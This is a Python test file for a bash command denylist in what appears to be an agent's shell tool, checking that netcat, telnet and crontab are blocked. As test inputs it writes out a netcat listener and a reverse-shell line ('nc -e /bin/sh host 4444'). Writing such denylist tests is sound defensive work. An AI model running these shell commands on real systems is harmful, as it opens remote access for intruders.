"""Tests for the bash command denylist."""

from src.tools._bash_exec import _check_command_denylist, _COMMAND_DENYLIST


def test_netcat_blocked():
    assert _check_command_denylist("nc -lvp 4444") is not None


def test_telnet_blocked():
    assert _check_command_denylist("telnet example.com 80") is not None


def test_crontab_blocked():
    assert _check_command_denylist("crontab -e") is not None


def test_python_allowed():
    assert _check_command_denylist("python foo.py") is None


def test_ls_allowed():
    assert _check_command_denylist("ls -la") is None


def test_path_prefix_stripped():
    # /usr/bin/nc should be treated same as nc
    assert _check_command_denylist("/usr/bin/nc -e /bin/sh host 4444") is not None


def test_empty_command_allowed():
    assert _check_command_denylist("") is None


def test_denylist_is_frozenset():
    assert isinstance(_COMMAND_DENYLIST, frozenset)
    assert "nc" in _COMMAND_DENYLIST
    assert "crontab" in _COMMAND_DENYLIST
